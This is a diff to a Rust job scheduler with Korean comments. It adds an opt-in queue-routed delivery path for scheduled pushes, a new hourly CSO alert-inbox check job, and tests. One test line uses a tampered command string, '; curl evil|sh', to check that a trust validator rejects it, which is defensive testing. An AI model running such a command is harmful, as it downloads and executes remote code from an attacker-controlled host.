@@ -12,6 +12,13 @@ use std::sync::Arc;
 use std::time::Duration;
 
 const TICK_SECS: u64 = 30;
+/// ★(0.14.31 · WP-3 B) `via_queue` 잡의 enqueue 경로 태그(`QueueEntry::origin`) — 관통 추적용.
+/// alert 라우팅의 `"alert"` 와 **다른 값**이다: 같은 큐에 들어가도 출처가 다르다(스케줄 발화 ↔
+/// 데몬 경보). 배달 규칙은 origin 을 보지 않으므로 동작 차이는 없고 관측만 갈린다.
+const SCHEDULE_QUEUE_ORIGIN: &str = "schedule";
+/// `via_queue` 적재의 활성 큐 상한 — 기존 enqueue 3경로와 **같은 100**(경보와 달리 보호선을
+/// 따로 두지 않는다: 시간당 1회 발화라 적체 축이 아니다).
+const SCHEDULE_QUEUE_CAP: usize = 100;
 /// 예정 시각보다 이만큼 늦게 발견하면 발화하지 않고 missed 처리 (데몬 다운 후 재시작 등)
 const MISS_WINDOW_SECS: i64 = 600;
 /// 반복(time) + fresh 조합에서 close_after_secs 미설정 시 적용하는 기본 TTL.
@@ -75,6 +82,16 @@ pub struct Job {
     /// — 구 파일·구 데몬과 양방향 호환(미지 필드 무시·부재=false).
     #[serde(default)]
     pub base_only: bool,
+    /// ★(0.14.31 · WP-3 B) true 면 push 를 **큐 경유**로 보낸다 — `fire_push` 의 직접 `inject`
+    /// (§8 "스케줄 push 가 큐를 우회한다"의 그 지점)를 타지 않고 대상 좌석의 `pending_queue` 에
+    /// 적재해, 배달자(watchdog 틱)가 초안·alt-screen·승인대기·빈 좌석·pause 게이트를 **전부**
+    /// 통과시킨 뒤에야 주입한다. 기본 false = 기존 잡 전원 무회귀(추가-전용 스키마 규약).
+    ///
+    /// 왜 잡마다 고르게 두는가: 직접 주입은 "지금 이 좌석에 즉시" 라는 의미가 필요한 잡
+    /// (phoenix 스냅샷 등)의 계약이고, 큐 경유는 "좌석이 받을 준비가 됐을 때" 라는 의미다.
+    /// 한쪽으로 통일하면 다른 쪽 잡의 의미가 조용히 바뀐다.
+    #[serde(default)]
+    pub via_queue: bool,
     #[serde(default)]
     pub launch: Option<LaunchSpec>,
 }
@@ -235,6 +252,33 @@ fn builtin_jobs() -> Vec<serde_json::Value> {
             "base_only": true,
             "command": "pk=\"${CYS_PACK_DIR:-$HOME/.cys/pack}\"; [ -x \"$pk/bin/cys-dept\" ] || exit 0; env -u CYS_ROLE \"$pk/bin/cys-dept\" promote-if-pending",
             "_builtin": "promote",
+            "_builtin_version": BUILTIN_JOBS_VERSION
+        }),
+        // ── ★(0.14.31 · WP-3 B) CSO alert inbox 정기 점검(60분) ────────────────────────
+        // **신규 id 라 BUILTIN_JOBS_VERSION 범프 불요·금지**(R3-P03-3 선례와 동일: 범프하면
+        // 기존 builtin 전체가 코드 정의로 통째 교체돼 운영자 수기 편집이 무언 소실된다).
+        // ★`via_queue: true` — 이 잡만 큐를 경유한다. 스케줄 push 는 원래 `fire_push`→`inject`
+        //   로 큐를 **우회**하는데(§8 명시), CSO 앞 정기 점검이 그 경로를 타면 초안·alt-screen·
+        //   승인대기·빈 좌석·pause 게이트를 전부 건너뛰고 좌석에 글자를 꽂는다. 큐 경유면
+        //   배달자(watchdog 틱)가 그 게이트를 전부 통과시킨 뒤에야 주입한다.
+        // ★`base_only` 를 세우지 않는다(=false): 부서 데몬은 **자기 CSO 좌석과 자기 alert_route
+        //   상태**를 가진다 — base 전용으로 만들면 부서 CSO 는 자기 데몬의 경보를 정기적으로
+        //   훑을 계기를 영영 못 받는다. 이 잡은 조직 전역 1건이 아니라 **데몬 지역 점검**이다.
+        // ★`if_absent: "skip"` — CSO 좌석이 없으면 조용히 건너뛴다(부재는 에러가 아니다 ·
+        //   좌석 없는 데몬에서 schedule.error 를 매 시간 쌓지 않는다).
+        // ★문안에 선두 라벨을 두지 않는다 — `ensure_machine_label` 이 `[schedule <id>]` 을
+        //   붙인다(기계 유래 표식의 단일 규약. 여기서 `[alert]` 를 흉내내면 데몬 경보와 스케줄
+        //   발화가 판독자에게 같은 것으로 보인다).
+        // ★무이상 카운터 갱신은 잡이 하지 않는다(정본 §4 B) — 파일 동시성 회피.
+        json!({
+            "id": "cso-alert-inbox-check-60m",
+            "every_minutes": 60,
+            "action": "push",
+            "to": "cso",
+            "if_absent": "skip",
+            "via_queue": true,
+            "text": "데몬 alert inbox 정기 점검(60분). 큐에 쌓인 [alert] 항목을 순서대로 읽고 좌석 건강·자원 게이트·컨텍스트 사이클 범위에서만 판단하라. 경보는 데몬이 밀어 넣는다 — 직접 구독(Monitor)·크론 재등록은 하지 마라. 이상이 없으면 아무것도 기록하지 마라(무이상 무기록).",
+            "_builtin": "alert",
             "_builtin_version": BUILTIN_JOBS_VERSION
         }),
     ]
@@ -932,7 +976,9 @@ async fn fire_push(daemon: &Arc<Daemon>, job: &Job) -> Result<String, String> {
         let mut spec = spec.clone();
         spec.role = format!("{}-fresh-{}", spec.role, now_epoch() as u64);
         let sid = launch_via_cli(daemon, &spec).await?;
-        inject(daemon, sid, text)?;
+        // ★(0.14.31 · WP-3 B) fresh 경로에도 같은 배달 선택을 적용한다 — 여기만 직접 주입으로
+        //   남기면 `via_queue` 잡이 fresh 옵션 하나로 게이트를 통째 우회한다(같은 계약의 구멍).
+        let how = deliver_push(daemon, job, sid, text)?;
         // TTL: fresh surface 누수 차단 — 지정(또는 반복 job 기본) 시간 후 자동 close.
         // 원샷+fresh는 명시 시에만, 반복(time)+fresh는 미설정이어도 기본 TTL로 회수한다.
         if let Some(ttl) = effective_close_ttl(job) {
@@ -942,7 +988,7 @@ async fn fire_push(daemon: &Arc<Daemon>, job: &Job) -> Result<String, String> {
                 let _ = crate::governance::close_surface(&d, sid, crate::governance::CloseCause::Reap);
             });
         }
-        return Ok(format!("fresh-launched and pushed (surface:{sid})"));
+        return Ok(format!("fresh-launched and {how} (surface:{sid})"));
     }
     let mut sid = daemon.roles.lock().unwrap().get(to).copied();
     // 대상 surface가 죽어 있거나 agent-backed가 아니면(빈 셸) 부재로 간주.
@@ -986,8 +1032,34 @@ async fn fire_push(daemon: &Arc<Daemon>, job: &Job) -> Result<String, String> {
         }
     }
     let sid = sid.ok_or_else(|| format!("role '{to}' absent"))?;
-    inject(daemon, sid, text)?;
-    Ok(format!("pushed to {to} (surface:{sid})"))
+    let how = deliver_push(daemon, job, sid, text)?;
+    Ok(format!("{how} to {to} (surface:{sid})"))
+}
+
+/// ★(0.14.31 · WP-3 B) 대상 좌석이 확정된 **뒤** 배달 방식을 고른다 — 큐 경유 또는 직접 주입.
+///
+/// 대상 선택(`fresh`·`if_absent`·빈 셸 판정)은 **위에서 이미 끝났다**: 그 앞에 끼워 넣으면
+/// 기존 잡들의 대상 의미가 조용히 바뀐다. 반대로 마지막 `inject` 한 곳만 바꾸면 `fresh` 경로가
+/// 게이트를 계속 우회한다 — 그래서 두 주입 지점이 **같은 이 함수**를 부른다.
+///
+/// 큐 경유는 배달 원장을 여기서 쓰지 않는다: 큐 배달 경로가 선기록(origin `queue`)과 영수증을
+/// 자기 시점에 남긴다(여기서 `record_audited` 를 또 하면 한 발화가 원장에 두 번 남는다).
+/// 큐 포화·좌석 소멸은 **에러**다 — 성공으로 보고하면 발화가 사라진 사실이 묻힌다.
+fn deliver_push(daemon: &Arc<Daemon>, job: &Job, sid: u64, text: &str) -> Result<&'static str, String> {
+    if !job.via_queue {
+        inject(daemon, sid, text)?;
+        return Ok("pushed");
+    }
+    crate::alert_route::enqueue_into_seat(
+        daemon,
+        sid,
+        text.to_string(),
+        Some(crate::alert_route::ALERT_FROM.to_string()),
+        SCHEDULE_QUEUE_ORIGIN,
+        SCHEDULE_QUEUE_CAP,
+    )
+    .map(|_| "queued")
+    .map_err(|e| format!("via_queue enqueue failed: {}", e.as_str()))
 }
 
 /// 선두 라벨(`[...]`) 유무 판정 — 판독자 `javis_mission._label_head` 와 **같은 규칙**이다:
@@ -1410,7 +1482,9 @@ mod tests {
             "id": "user-custom-job", "every_minutes": 30, "action": "push", "to": "master"
         })];
 
-        // 1차: built-in 8개(phoenix2 + learn2 + cycle2 + formation1 + promote1) 생성 → changed=true.
+        // 1차: built-in 9개(phoenix2 + learn2 + cycle2 + formation1 + promote1 + alert1) 생성 → changed=true.
+        // ★(0.14.31 · WP-3 B) 계수 갱신: 신규 id `cso-alert-inbox-check-60m` 1건 append.
+        //   버전은 **범프하지 않았다**(신규 id 는 버전 무관 append — 아래 범프 금지 핀 유지).
         let (c1, conf1) = apply_builtin_jobs(&mut jobs);
         assert!(c1, "1차 ensure 는 built-in 잡을 생성해야 한다");
         assert!(conf1.is_empty(), "conflict 없음(예약 id 미선점)");
@@ -1433,7 +1507,7 @@ mod tests {
             "T10 P3-2 대기형 승격 집행 틱 잡 생성"
         );
         assert!(ids.contains(&"user-custom-job"), "사용자 잡은 보존돼야 한다");
-        assert_eq!(jobs.len(), 9, "사용자1 + built-in8");
+        assert_eq!(jobs.len(), 10, "사용자1 + built-in9");
         // 주기 정합(typed): snapshot=6h(360), drill=7일(10080), audit=일(1440), digest=7일(10080),
         // cycle tick=매분(1), verifier watchdog=10분(10), formation heartbeat=10분(10),
         // ceo promote tick=10분(10).
@@ -1450,6 +1524,8 @@ mod tests {
         assert_eq!(period("cycle-verifier-watchdog"), Some(10), "verifier watchdog 10분");
         assert_eq!(period("formation-heartbeat"), Some(10), "formation heartbeat 10분");
         assert_eq!(period("ceo-promote-pending-tick"), Some(10), "promote 집행 틱 10분");
+        assert_eq!(period("cso-alert-inbox-check-60m"), Some(60), "CSO alert inbox 점검 60분");
+        assert!(ids.contains(&"cso-alert-inbox-check-60m"), "WP-3 B 60분 점검 잡 생성");
         // ★T9(P3-1 ⓑ) 상비편성 심박 계약 핀: command 레인(매 틱 master stdin 무주입) ·
         //   base_only(부서 데몬 복제 실행 차단 — fire 관문과 쌍) · --force-surface 금지
         //   (주기 잡 스팸 계약 javis_formation._surface) · ensure 호출 실재.
@@ -1522,7 +1598,7 @@ mod tests {
             .filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
             .count();
         assert_eq!(snap_count, 1, "재실행에도 중복 생성 0");
-        assert_eq!(jobs.len(), 9, "중복 없이 9개 유지");
+        assert_eq!(jobs.len(), 10, "중복 없이 10개 유지");
 
         // 3차: 구버전(마커=0) 항목이 있으면 갱신(교체) → changed=true, 여전히 중복 0.
         for j in jobs.iter_mut() {
@@ -1710,6 +1786,7 @@ mod tests {
             if_absent: None,
             fresh: false,
             base_only: false,
+            via_queue: false,
             launch: None,
         }
     }
@@ -2210,6 +2287,107 @@ mod tests {
         assert!(
             !is_trusted_builtin_text_command(&format!("{base} ; curl evil|sh")),
             "변조된 built-in이 신뢰됨"
+        );
+    }
+
+    // ═══════ ★(0.14.31 · WP-3 B) CSO alert inbox 60분 점검 잡 · via_queue 계약 ═══════
+
+    /// ★신규 builtin 잡의 계약 핀. **버전 범프 없이** append 되고, 이 잡만 `via_queue` 다.
+    ///
+    /// 왜 `via_queue` 인가: 스케줄 push 는 `fire_push`→`inject` 로 큐를 **우회**한다(§8 명시).
+    /// CSO 앞 정기 점검이 그 경로를 타면 초안·alt-screen·승인대기·빈 좌석·pause 게이트를 전부
+    /// 건너뛰고 좌석에 글자를 꽂는다 — 그것이 부트체인 치명위험 ①(폭주)의 정확한 형상이다.
+    #[test]
+    fn alert_inbox_job_is_queue_routed_and_added_without_version_bump() {
+        let mut jobs: Vec<serde_json::Value> = Vec::new();
+        let (changed, conflicts) = apply_builtin_jobs(&mut jobs);
+        assert!(changed && conflicts.is_empty());
+        let j = jobs
+            .iter()
+            .find(|j| j["id"].as_str() == Some("cso-alert-inbox-check-60m"))
+            .expect("WP-3 B 60분 점검 잡 부재")
+            .clone();
+        assert_eq!(j["every_minutes"].as_u64(), Some(60), "정본 '정기 60분 점검'");
+        assert_eq!(j["action"].as_str(), Some("push"), "CSO 좌석 앞 push 레인");
+        assert_eq!(j["to"].as_str(), Some("cso"));
+        assert_eq!(j["if_absent"].as_str(), Some("skip"), "좌석 부재는 에러가 아니다");
+        assert_eq!(j["via_queue"].as_bool(), Some(true), "이 잡만 큐 경유(게이트 통과)");
+        assert_eq!(j["base_only"].as_bool(), None, "부서 데몬도 자기 CSO 를 점검한다(base 전용 아님)");
+        // ★범프 금지 — 신규 id 는 버전 무관 append 다(범프는 기존 builtin 을 코드 정의로 통째
+        //   교체해 운영자 수기 편집을 무언 소실시킨다).
+        assert_eq!(BUILTIN_JOBS_VERSION, 2, "신규 잡 추가로 버전을 올리지 않았다");
+        assert_eq!(j["_builtin_version"].as_u64(), Some(BUILTIN_JOBS_VERSION));
+        // 재실행 무접촉(중복 0) — add-if-missing 멱등.
+        let (c2, _) = apply_builtin_jobs(&mut jobs);
+        assert!(!c2, "동버전 재실행은 무접촉");
+        assert_eq!(
+            jobs.iter().filter(|j| j["id"].as_str() == Some("cso-alert-inbox-check-60m")).count(),
+            1,
+            "재실행에도 중복 생성 0"
+        );
+        // ★다른 builtin 잡은 **하나도** via_queue 가 아니다(기존 잡 무회귀 — 직접 주입 의미 보존).
+        for other in jobs.iter().filter(|x| x["id"].as_str() != Some("cso-alert-inbox-check-60m")) {
+            assert!(
+                other.get("via_queue").is_none(),
+                "{} 에 via_queue 가 붙었다(기존 잡 의미 변경)",
+                other["id"]
+            );
+        }
+        // 문안 계약: 선두 라벨을 스스로 달지 않는다(ensure_machine_label 이 `[schedule <id>]` 를
+        // 붙인다) · CSO 를 다시 구독(Monitor)·크론으로 돌려보내지 않는다.
+        let text = j["text"].as_str().expect("점검 문안 부재");
+        assert!(!text.starts_with('['), "선두 라벨은 데몬이 단다(중복 라벨 금지): {text}");
+        assert_eq!(
+            ensure_machine_label(text, "cso-alert-inbox-check-60m"),
+            format!("[schedule cso-alert-inbox-check-60m] {text}")
+        );
+        assert!(text.contains("Monitor"), "직접 구독 금지 문구가 있어야 한다");
+        assert!(text.contains("무이상 무기록"), "무이상 무기록 규약 문구가 있어야 한다");
+    }
+
+    /// ★`Job::via_queue` 는 **추가-전용** 필드다: 구 schedule.json(필드 부재)은 false 로 읽히고,
+    /// 그 잡들은 종전대로 직접 주입 경로를 탄다(무회귀).
+    #[test]
+    fn via_queue_defaults_false_for_legacy_schedule_files() {
+        let legacy: Job = serde_json::from_value(json!({
+            "id": "legacy", "action": "push", "to": "master", "text": "x"
+        }))
+        .expect("구 파일 파싱");
+        assert!(!legacy.via_queue, "부재 = false(기존 잡 전원 무회귀)");
+        let opted: Job = serde_json::from_value(json!({
+            "id": "new", "action": "push", "to": "cso", "text": "x", "via_queue": true
+        }))
+        .expect("신 파일 파싱");
+        assert!(opted.via_queue);
+    }
+
+    /// ★배달 선택은 대상 좌석이 확정된 **뒤** 한 지점에서만 갈린다 — `fresh` 경로와 일반 경로가
+    /// **같은 함수**를 부르지 않으면 `fresh: true` 하나로 게이트를 통째 우회할 수 있다.
+    /// (소스 핀: 이 배선은 async 경로라 단위 검체로 두 갈래를 동시에 재현하기 어렵다.)
+    #[test]
+    fn source_pin_both_push_paths_share_one_delivery_choice() {
+        let src = include_str!("schedule.rs");
+        let at = src.find("async fn fire_push(").expect("fire_push 소실");
+        // fire_push 본문만 자른다 — 바로 뒤의 `deliver_push`(그 안에 직접 주입이 **있어야** 한다)를
+        // 포함하면 아래 음성 단언이 자기 자신을 잡는다.
+        let end = src[at..]
+            .find("fn deliver_push(")
+            .map(|e| at + e)
+            .expect("deliver_push 소실");
+        let body = &src[at..end];
+        assert_eq!(
+            body.matches("deliver_push(daemon, job, sid, text)").count(),
+            2,
+            "fresh 경로와 일반 경로 **양쪽**이 같은 배달 선택을 타야 한다"
+        );
+        assert!(
+            !body.contains("inject(daemon, sid, text)?;"),
+            "fire_push 안에 직접 주입이 남아 있다(via_queue 가 우회된다)"
+        );
+        // fresh 의 TTL 회수 배선이 큐 분기로 인해 생략되지 않았는지(좌석 누수 방지).
+        assert!(
+            body.contains("effective_close_ttl(job)"),
+            "fresh TTL 회수 배선이 사라졌다(surface 누수)"
         );
     }
 }
